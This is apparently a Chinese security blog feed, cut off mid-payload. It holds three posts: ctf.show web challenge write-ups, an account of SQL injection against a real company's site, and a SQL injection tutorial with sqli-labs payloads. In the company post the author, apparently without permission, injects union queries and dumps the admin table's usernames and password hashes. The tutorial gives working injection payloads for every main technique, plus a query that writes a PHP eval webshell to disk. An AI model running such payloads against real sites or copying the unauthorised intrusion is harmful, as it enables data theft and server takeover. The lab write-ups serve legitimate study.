和域名有关的信息收集</p><p>我们对该域名进行DNS检测 ，可用阿里云查询链接：<a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a><br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web11.png"></p><p>​       </p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>题目提示“有时候网站上的公开信息，就是管理员常用密码”  可能与管理员有关</p><p>查看是否有路径可拿，访问 robots.txt ,发现存在管理员的登录目录admin，访问，但需要账号密码。<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web12.png"></p><p>​       </p><p>根据提示，密码应该就在此网站公开，找到页脚，有一串数字，试试。<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web12(1).png"></p><p>​       </p><p>登录得到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web12(2).png"></p><p>​       </p><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p>题目提示 “技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码”</p><p>查找页面的可疑的文档，又是在页脚发现一个文件超链接<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web13.png"></p><p>​       </p><p>打开后发现是一个使用文档，有后台登录地址及身份<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web13(1).png"></p><p>​       </p><p>直接访问显示错误，我们将 your-domain 改为我们题目的链接，构造 URL ，访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://855583d1-b17f-4687-9201-361a2c8dfedb.challenge.ctf.show/system1103/login.php</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web13(2).png"></p><p>​       </p><p>登陆成功后即可看到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web13(3).png"></p><p>​       </p><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p>题目提示 “有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人”</p><p>所以我们直接访问 editor ，发现进入到了一个编辑界面 ，在编辑界面的这 3 个按钮中可以发现一个 文件空间<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web14.png"></p><p>点击文件空间可以发现可以进行 目录遍历<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web14(1).png"></p><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web14(2).png">        </p><p>寻找一番，发现 flag 在 var/www/html/nothinghere/fl000g.txt 下，于是构造 URL 访问 ,得到 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1bef8e6b-a152-4327-a454-c78e8bb52230.challenge.ctf.show/nothinghere/fl000g.txt</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web14(3).png"></p><p>​       </p><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><p>题目提示 “公开的信息比如邮箱，可能造成信息泄露，产生严重后果”  在页脚发现一个邮箱，暂时还不知道思路</p><p>在 URL 尝试访问 admin，发现可以<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web15.png"></p><p>​       </p><p>不知道账号密码，尝试 用户为 1 显示用户名错误，尝试 用户为 admin 显示密码错误，所以 admin账户存在</p><p>我们点击忘记密码，发现有密保 “我的所在地是哪个城市？”<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web15(1).png"></p><p>​       </p><p>这可把我整蒙了。这和邮箱有什么关系？？ 随后发觉这是个QQ邮箱，于是搜索该QQ号，发现城市名是 西安<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web15(2).png"></p><p>重置密码成功<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web15(3).png"></p><p>然后我们就可以开开心心登陆后台了，拿到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web15(4).png"></p><p>​       </p><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><p>题目提示 “对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露” 所以跟探针有关</p><blockquote><p>资料显示：<br>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。是一个查看服务器信息的工具。<br>比如查看服务器支持什么，不支持什么，空间速度等等状况！</p></blockquote><p>本题与探针有关，尝试访问 <code>tz.php</code>  构造 URL </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://9ef070e8-9da7-4f0e-b4f6-9f49f0cf58f0.challenge.ctf.show/tz.php</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web16.png"></p><p>点击 PHPINFO<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web16(1).png"></p><p>在页面内寻找 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web16(2).png"></p><p>​       </p><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><p>题目提示 查找 ctfer.com 的真实 IP</p><p>使用 fofa 查找即可<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web17.png"></p><p>​       </p><h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p>打开本关卡是一个小游戏，查看它的 JS 代码，当分数高大于100时会输出一串东西<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web18.png"></p><p>​       </p><p>将编码拿去Unicode解码一下<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web18(1).png"></p><p>​       </p><p>根据 “你赢了，去幺幺零点皮爱吃皮看看”提示，访问 <code>110.php</code>  构造 URL </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c942730e-776b-45cd-bcd4-573d4368b08e.challenge.ctf.show/110.php</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web18(2).png"></p><p>​        </p><h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><p>题目提示 “密钥什么的，就不要放在前端了”</p><p>查看源码发现一些信息，显示如果  post 请求满足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</span><br></pre></td></tr></table></figure><p> 就能打印出 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web19.png"></p><p>​       </p><p>于是构造 post 请求，拿到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web19(1).png"></p><p>​       </p><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><p>题目提示“mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了”  跟mdb文件泄露有关</p><p>搜索资料过后发现： 直接查看 URL 路径添加 /db/db.mdb </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ad92e72a-2c61-4ae7-a0d1-e3b4761affbc.challenge.ctf.show/db/db.mdb</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web20.png"></p><p>​       </p><p>下载文件通过 txt 打开，搜索 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web20(1).png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对某公司渗透实测</title>
      <link href="/post/1/"/>
      <url>/post/1/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这阵子练习太多的CTF有点乏了，打算回头看看老本行，但是碍于本人太菜了😭，只能找找相对简单，大师傅们不屑一顾的站点，于是乎在我不经意间发现了某公司网站</p><h2 id="漏掉的点"><a href="#漏掉的点" class="headerlink" title="漏掉的点"></a>漏掉的点</h2><p>起初我是奔着弱口令去的，但对该公司的后台管理系统疯狂尝试了半天后无果，你以为我就这样放弃了吗？<del>那你真的是猜的很准</del>。</p><p>于是我又回到公司主页，随手在url 里添加了id 参数，不试不知道，一试吓一跳。当将数值取1 时页面有反馈    </p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/file/3575.png">    </p><p>​     </p><h2 id="尝试注入"><a href="#尝试注入" class="headerlink" title="尝试注入"></a>尝试注入</h2><p>在发现参数可改且有不同反馈之后进行下一步测试</p><p>先试试不考虑过滤的查显示位 sql 语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span><span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/3576.png">    </p><p>意不意外，惊不惊喜？该公司网站并没有对敏感字符做过滤，于是乎我们就查到了一些数据库里的信息。</p><p>发现数据库中存在 admin表，表中有 id,username,password,quanxian 参数</p><p>​       </p><p>废话不多说，赶紧看一下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(concat(id,<span class="number">0x7e</span>,username,<span class="number">0x3A</span>,password,<span class="number">0x3A</span>,quanxian,<span class="number">0x7e</span>)) <span class="keyword">from</span> admin),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/3577.png"></p><p>可以看到用户名为 nie 的具有admin权限，心里美滋滋，解密后就可以登录后台啦嘿嘿。密码是加密过的</p><p>​       </p><p>于是反手就是丢解密工具里去了。。。。。。</p><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/71609.png"></p><p>​               真服了。。。。。。</p><p>​                                                            <img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/0g9nf.jpg"></p><p>​           既然解密未果，那此次的渗透就到此为止啦 ~</p><p>​         </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>对目标漏洞的寻找要全方位，不放过任何一个细节</strong></p><div align="center"> 好啦，又水一个洞 </font>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/post/8/"/>
      <url>/post/8/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>此文是基于MySQL数据库的学习记录</p><h2 id="1-认识sql注入"><a href="#1-认识sql注入" class="headerlink" title="1.认识sql注入"></a>1.认识sql注入</h2><ol><li>sql注入是一种web应用代码漏洞，在与数据库有交互的地方没有对用户的输入做好限制且没有对传入数据的进行过滤，通过构造特殊的请求，使web应用执行附加条件的sql语句以此返回想要的信息，实现对数据库的任意查询</li><li>常见sql注入的类型：</li></ol><blockquote><p>1.显错注入 </p><p>2.报错注入</p><p>3.布尔盲注</p><p>4.延时注入（基于时间的盲注）</p><p>5.http-header注入(User-Agent 和 Cookie)</p><p>6.堆叠注入</p><p>7.DNS_log注入</p></blockquote><p>3.sql注入的作用：</p><blockquote><p>1.绕过登陆验证</p><p>2.获取敏感信息</p><p>3.文件操作（读写，传马）</p><p>4.执行系统命令（UDF）</p></blockquote><h2 id="2-sql注入类型详解"><a href="#2-sql注入类型详解" class="headerlink" title="2.sql注入类型详解"></a>2.sql注入类型详解</h2><p>1.显错注入： 也称为联合注入，因为在显错注入里最常用的查询语句结构就是 union 联合查询。这种注入方式的前提是我们可以看到想要的回显，数据库的执行结果 <strong>直接显示</strong> 到页面上，常用的步骤：</p><blockquote><p>1.判断注入点是否存在**?id=1’ **报错就存在sql注入。原因是无论字符型还是整型都会因为单引号个数不匹配而报错</p><p>2.使用 <strong>order by</strong> 判断字段(“少准对 多错”)</p><p>3.使用 <strong>union select</strong> 联合查询查看显示位，注意：要保证union 前面的查询错误才会显示后面的查询， 例如: <strong>?id=-123 union select 1,2,3,4– -</strong></p><p>4.在显示位上使用查询 库、表、字段、字段内容 的sql语句</p></blockquote><p>2.报错注入： 前提是对方服务器开启了报错显示服务。利用报错服务获取数据库数据的操作就是报错注入，通常与 **union select **连用；一般步骤：</p><blockquote><p>1.判断是否存在注入点（同上）</p><p>2.故意构造报错语句，这里我们常用的3个函数 <strong>updatexml(XML_document, XPath_string, new_value)</strong>  、<strong>floor()</strong>  、<strong>extractvalue(XML_document，xpath_string)</strong> </p><p>例如：**?id=-1’ union select updatexml(1,concat(‘.’,(select group_concat(schema_name)from information_schema.schemata)),1);– -**</p><p>解释两个函数：</p><p>1.<strong>updatexml(XML_document, XPath_string, new_value)</strong>  用来更新XML文档，该函数有3个参数。 </p><p>第一个参数：是string格式，为XML文档对象的名称，文中为Doc</p><p>第二个参数：代表路径，Xpath格式的字符串例如    //title【@lang】 </p><p>第三个参数：string格式，替换查找到的符合条件的数据</p><p>updatexml使用时，1、3参数可以全写阿拉伯数字，不影响。主要使用的是第2参数的格式错误。当<strong>xpath_string</strong>格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）但是最多返回<strong>32位</strong></p><p>例如 爆库名 构造payload：**?id=-1’ union select updatexml(1,concat(‘~’,(select group_concat(schema_name)from information_schema.schemata)),1);– -**</p><p>2.<strong>extractvalue(XML_document，xpath_string)</strong>  此函数用来从目标XML中返回包含所查询值的字符串，有两个参数。</p><p>第一个参数：string格式，为XML文档对象的名称 </p><p>第二个参数：xpath_string（xpath格式的字符串）</p><p>extractvalue使用时，1参数可以写阿拉伯数字填充，不影响。当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）但是最多返回<strong>32位</strong></p><p><strong>?id=-1’ union select extractvalue(1,concat(‘~’,(select database())));– -</strong></p></blockquote><p>3.布尔盲注：当我们在注入时遇到有些网站没有输出点，且关闭了错误回显，这时我们可以考虑使用布尔盲注。盲注基本就是猜，费时费力。一般使用以下几个函数进行猜解。</p><blockquote><p>1.length()：函数的返回值为字符串的字节长度。</p><p>2.substr()：截取字符串，用法substr(string, start,length)</p><p>3.string-指定的要截取的字符串  start-规定在字符串的何处开始 length-指定要截取的字符串长度</p><p>4.ascii()：返回字符串中第一个字符的ascii值</p><p>使用演示：</p><h3 id="1-使用length-函数猜数据库名长度"><a href="#1-使用length-函数猜数据库名长度" class="headerlink" title="1.使用length()函数猜数据库名长度"></a>1.使用length()函数猜数据库名长度</h3><p>如length(database())&gt;10,页面显示正常</p><p>length(database())&gt;20,页面显示不正常</p><p>length(database())=9,页面显示正常</p><p>我们可以用二分法猜解得到数据库的长度</p><h3 id="2-利用ascii猜数据库名"><a href="#2-利用ascii猜数据库名" class="headerlink" title="2.利用ascii猜数据库名"></a>2.利用ascii猜数据库名</h3><p>and (ascii(substr(database(),1,1)))=100,如果页面返回正常，说明数据库名称第一位是d</p><h3 id="3-猜字段名"><a href="#3-猜字段名" class="headerlink" title="3.猜字段名"></a>3.猜字段名</h3><p>and (ascii(substr((select column_name from information_schema.columns where table_name=’aaa’ limit 0,1),1,1)))&gt;100</p></blockquote><p>4.延时注入(基于时间的盲注)：有时候我们会遇到一种情况，无论怎么操作页面都是返回正常，这时我们可以考虑用延时注入</p><blockquote><p>延时注入最常用的函数<strong>sleep()</strong></p><p>sleep()：执行挂起一段时间,也就是等待一段时间在继续执行</p><p>例：select * from users where id=1 and sleep(5);  /* 5秒之后执行SQL语句*/</p><p>if(expr1,expr2,expr3)：expr1为0或者null或者false，则返回 expr3 ; 否则，返回expr2。</p><p>构造语句：and if(ascii(substr(database(),1,1))=100,0,sleep(10))</p><p>如果库名第一个字符是d，则网页延时10秒</p></blockquote><p>5.http-header注入：通过构造 HTTP请求头来达到爆出数据库内容的方式。HTTP请求头内容很多，我们通常修改以下两个参数 <strong>User-Agent</strong>  和 <strong>Cookie</strong> (在使用之前要将请求头发送到 repeater 模块,才能修改)</p><blockquote><p>（User-Agent）一般步骤：</p><p>1.抓包，将包发送到repeater模块</p><p>2.将User-Agent删掉，自己构造一个 ，还是按照之前的思路，先输入一个单引号，然后放包，若页面显示报错，接下来的步骤就很简单了，制作一个能用的payload。比如:  <strong>User-Agent: 666’ or updatexml (1,concat (0x7e,database()),0) or ‘</strong></p><p>3.持续构造payload 查看不同数据</p><p>(Cookie) 一般步骤 ：</p><p>1.抓包，将包发送到<strong>repeater</strong>模块</p><p>2.例如我们现在账号后面加一个逗号，放包，若是页面显示错误，存在sql注入</p><p>3.构造payload ，将cookie 构造成 例如 <strong>Cookie: ant[uname]=admin’ and updatexml (1, concat (Ox7e, database()),0) or ‘;</strong></p></blockquote><p>6.堆叠注入: 就是同时执行两条以上的sql语句</p><blockquote><p>例如： <strong>‘;select * from admins;show database()</strong></p></blockquote><p>7.DNS_log注入：属于sql 注入的一种(oob在sql中的应用)  oob：数据外带。前提条件： secure_file_priv = “ ” 否则不行， 任意文件读取。</p><p>首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/1545399-20190329195347336-890312924.png">        </p><p><strong>效果</strong>：将盲注，时间注入 变成显错(联合)注入</p><p><strong>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息</strong><br><strong>简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</strong></p><p><strong>利用场景:</strong></p><p>在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，这时候就要用到我们的DNS_log注入。</p><h2 id="3-sqli-靶场"><a href="#3-sqli-靶场" class="headerlink" title="3.sqli 靶场"></a>3.sqli 靶场</h2><h3 id="1关：’-闭合-显错报错"><a href="#1关：’-闭合-显错报错" class="headerlink" title="1关：’ 闭合 显错报错"></a><strong>1关：’ 闭合 显错报错</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3-- - //查显示位</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span><span class="comment">-- - //查全库</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),3-- - //查表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="number">3</span><span class="comment">-- - //查字段</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(concat(id,0x7e,username,0x3A,password,0x7e)) from users),3-- - //查数据</span></span><br></pre></td></tr></table></figure><h3 id="2关：数字型注入-显错注入"><a href="#2关：数字型注入-显错注入" class="headerlink" title="2关：数字型注入  显错注入"></a><strong>2关：数字型注入  显错注入</strong></h3><p>payload 参考2关</p><h3 id="3关-‘-闭合-显错注入"><a href="#3关-‘-闭合-显错注入" class="headerlink" title="**3关: ‘) 闭合 显错注入 **"></a>**3关: ‘) 闭合 显错注入 **</h3><p>payload 参考2关</p><h3 id="4关：”-闭合-显错注入"><a href="#4关：”-闭合-显错注入" class="headerlink" title="4关：”) 闭合 显错注入"></a><strong>4关：”) 闭合 显错注入</strong></h3><p>payload 参考2关</p><h3 id="5关：’-闭合-报错注入"><a href="#5关：’-闭合-报错注入" class="headerlink" title="5关：’ 闭合 报错注入"></a><strong>5关：’ 闭合 报错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select database())),1)-- -//查当前数据库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;.&#x27;</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>)<span class="comment">-- - //查全库（使用limit 控制）</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)),1)-- - //查表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)) ,<span class="number">1</span>)<span class="comment">-- - //查字段</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select concat(id,0x7e,username,0x3A,password,0x7e)from users limit 0,1)),1)-- -//查数据</span></span><br></pre></td></tr></table></figure><h3 id="6关：”-闭合-报错注入"><a href="#6关：”-闭合-报错注入" class="headerlink" title="6关：” 闭合 报错注入"></a><strong>6关：” 闭合 报错注入</strong></h3><p>payload 参考5关</p><h3 id="7关：-“-闭合-文件写入"><a href="#7关：-“-闭合-文件写入" class="headerlink" title="7关： “)) 闭合  文件写入"></a><strong>7关： “)) 闭合  文件写入</strong></h3><p>上传木马，使用蚁剑连接</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union </span></span><br><span class="line"><span class="string">select 1,2,&#x27;</span><span class="operator">&lt;</span>?php eval($_POST[cmd]);<span class="operator">&gt;</span><span class="string">&#x27; into outfile &quot;D:\\phpstudy_pro\\999.php&quot; -- -</span></span><br><span class="line"><span class="string">bug：因为?id=1，所以上传的文件中会显示第1个用户的账号和密码。若?id=2，则上传的文件中会显示第2个用户的账号和密码。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>)) <span class="keyword">union</span> </span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;&lt;?php eval($_POST[cmd]);&gt;&#x27;</span> <span class="keyword">into</span> outfile &quot;D:\\phpstudy_pro\\999.php&quot; <span class="comment">-- -</span></span><br><span class="line">则不会出现这种情况</span><br></pre></td></tr></table></figure><h3 id="8关：’-闭合-布尔盲注"><a href="#8关：’-闭合-布尔盲注" class="headerlink" title="8关：’ 闭合 布尔盲注"></a><strong>8关：’ 闭合 布尔盲注</strong></h3><h3 id="9关：’-闭合-时间盲注"><a href="#9关：’-闭合-时间盲注" class="headerlink" title="9关：’ 闭合 时间盲注"></a><strong>9关：’ 闭合 时间盲注</strong></h3><h3 id="10关：”-闭合-时间盲注"><a href="#10关：”-闭合-时间盲注" class="headerlink" title="10关：” 闭合 时间盲注"></a><strong>10关：” 闭合 时间盲注</strong></h3><h3 id="11关：’-闭合-显错注入"><a href="#11关：’-闭合-显错注入" class="headerlink" title="11关：’ 闭合 显错注入"></a><strong>11关：’ 闭合 显错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 猜字段payload ：uname<span class="operator">=</span>admin<span class="string">&#x27; order by 2#&amp;passwd=admin&amp;submit=Submit</span></span><br><span class="line"><span class="string">显示位：uname=-admin&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>##<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit </span><br><span class="line">查数据库：uname<span class="operator">=</span><span class="operator">-</span>admin<span class="string">&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata)##&amp;passwd=1&amp;submit=Submit 或uname=-admin&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata#<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br><span class="line"></span><br><span class="line">查表：uname<span class="operator">=</span><span class="operator">-</span>admin<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)##&amp;passwd=1&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查字段：uname=-admin&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>andtable_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)##<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>submit Submit</span><br><span class="line"></span><br><span class="line">字段内容：uname<span class="operator">=</span><span class="operator">-</span>admin<span class="string">&#x27; union select 1,(select group_concat(concat(id,0x7e,username,0x3A,password,0x7e))from users)##&amp;passwd=1&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h3 id="12关：”-闭合-显错注入，-同11关"><a href="#12关：”-闭合-显错注入，-同11关" class="headerlink" title="12关：”) 闭合 显错注入， 同11关"></a><strong>12关：”) 闭合 显错注入， 同11关</strong></h3><h3 id="13关：’-闭合-报错注入"><a href="#13关：’-闭合-报错注入" class="headerlink" title="13关：’) 闭合 报错注入"></a><strong>13关：’) 闭合 报错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查看当前数据库：uname<span class="operator">=</span>admin<span class="string">&#x27;) union select 1,updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select database())),1)##&amp;passwd=1&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查看全部数据库：uname=admin&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;.&#x27;</span>,(<span class="keyword">select</span> concat(schema_name)<span class="keyword">from</span> information_schema.schemata limit <span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>)##<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit  <span class="operator">/</span><span class="operator">/</span>使用 limit控制输出内容 </span><br><span class="line"></span><br><span class="line">查看表：uname<span class="operator">=</span>admin<span class="string">&#x27;) union select 